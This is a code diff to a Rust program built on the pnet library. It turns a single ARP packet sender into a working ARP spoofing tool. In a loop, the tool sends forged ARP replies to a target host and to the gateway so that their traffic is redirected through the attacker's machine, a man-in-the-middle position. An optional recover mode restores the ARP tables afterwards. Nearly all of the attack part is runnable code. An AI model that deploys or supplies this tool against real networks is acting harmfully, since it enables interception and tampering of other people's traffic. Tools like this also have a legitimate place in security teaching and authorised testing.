@@ -5,11 +5,10 @@ use pnet::packet::arp::*;
 use pnet::packet::ethernet::*;
 use pnet::packet::{MutablePacket, Packet};
 use std::net::*;
+use std::{thread, time::Duration};
 
 pub mod cli;
 pub mod config;
-
-// const BROADCAST: MacAddr = MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
 
 fn build_arp_packet(
     operation: ArpOperation,
@@ -44,46 +43,65 @@ fn build_ethernet_packet(host_mac: MacAddr, target_mac: MacAddr, arp_packet: &Ve
     e_packet.packet().to_owned()
 }
 
-fn get_mac_ip(iface_name: &str) -> (NetworkInterface, MacAddr, Ipv4Addr) {
+fn get_interface(iface_name: &str) -> NetworkInterface {
     let interface = pnet::datalink::interfaces()
         .into_iter()
         .find(|iface| iface.name == iface_name)
         .expect("Cannot find interface");
-    let iface_mac = interface.mac;
-    let iface_ip = match interface
-        .ips
-        .iter()
-        .find(|iface| iface.is_ipv4())
-        .expect("Cannot find IPv4 address")
-        .ip()
-    {
-        IpAddr::V4(ip) => ip,
-        _ => panic!(),
-    };
-    (interface, iface_mac.unwrap(), iface_ip)
+    interface
+}
+
+fn send_arp_reply(
+    tx: &mut Box<dyn pnet::datalink::DataLinkSender>,
+    src_ip: Ipv4Addr,
+    src_mac: MacAddr,
+    target_ip: Ipv4Addr,
+    target_mac: MacAddr,
+) {
+    let arp_packet = build_arp_packet(
+        ArpOperations::Reply, // ArpOperations::[ Request , Reply ]
+        src_ip,
+        src_mac,
+        target_ip,
+        target_mac,
+    );
+    let ethernet_packet = build_ethernet_packet(src_mac, target_mac, &arp_packet);
+    tx.send_to(&ethernet_packet, None);
+    println!("{}, {} is at {}", target_mac, src_ip, src_mac);
+}
+
+fn restore_table(params: &config::Params, tx: &mut Box<dyn pnet::datalink::DataLinkSender>) {
+    send_arp_reply(
+        tx,
+        params.host_ip,
+        params.host_mac,
+        params.gateway_ip,
+        params.gateway_mac,
+    );
+    send_arp_reply(
+        tx,
+        params.target_ip,
+        params.target_mac,
+        params.gateway_ip,
+        params.gateway_mac,
+    );
+    send_arp_reply(
+        tx,
+        params.gateway_ip,
+        params.gateway_mac,
+        params.target_ip,
+        params.target_mac,
+    );
+    thread::sleep(Duration::from_secs(1));
 }
 
 fn main() {
     let params = cli::command_line_start();
-    let (interface, host_orig_mac, host_orig_ip) = get_mac_ip(&params.interface);
-    println!("Your MAC address: {}", host_orig_mac);
-    println!("Your IP address:  {}", host_orig_ip);
+    let interface = get_interface(&params.interface);
+    println!("Source MAC address: {}", params.host_mac);
+    println!("Source IP address:  {}", params.host_ip);
 
-    let target_ip = Ipv4Addr::new(192, 168, 1, 254);
-    let target_mac = MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
-
-    let arp_packet = build_arp_packet(
-        ArpOperations::Reply, // ArpOperations::[ Request , Reply ]
-        params.host_ip,
-        params.host_mac,
-        params.target_ip,
-        params.target_mac,
-    );
-    let ethernet_packet = build_ethernet_packet(params.host_mac, params.target_mac, &arp_packet);
-    println!("ARP PACKET: {:?}\n", arp_packet);
-    println!("ETHERNET PACKET: {:?}", ethernet_packet);
-
-    let (mut tx, mut rx) = match channel(&interface, Default::default()) {
+    let (mut tx, _) = match channel(&interface, Default::default()) {
         Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
         Ok(_) => panic!("Unhandled channel type"),
         Err(e) => panic!(
@@ -91,7 +109,27 @@ fn main() {
             e
         ),
     };
-    tx.send_to(&ethernet_packet, None);
-    tx.send_to(&ethernet_packet, None);
-    println!("Enviou");
+
+    if !params.recover {
+        loop {
+            send_arp_reply(
+                &mut tx,
+                params.gateway_ip,
+                params.host_mac,
+                params.target_ip,
+                params.target_mac,
+            );
+            send_arp_reply(
+                &mut tx,
+                params.target_ip,
+                params.host_mac,
+                params.gateway_ip,
+                params.gateway_mac,
+            );
+            thread::sleep(Duration::from_secs(1));
+        }
+    } else {
+        restore_table(&params, &mut tx);
+        restore_table(&params, &mut tx);
+    }
 }
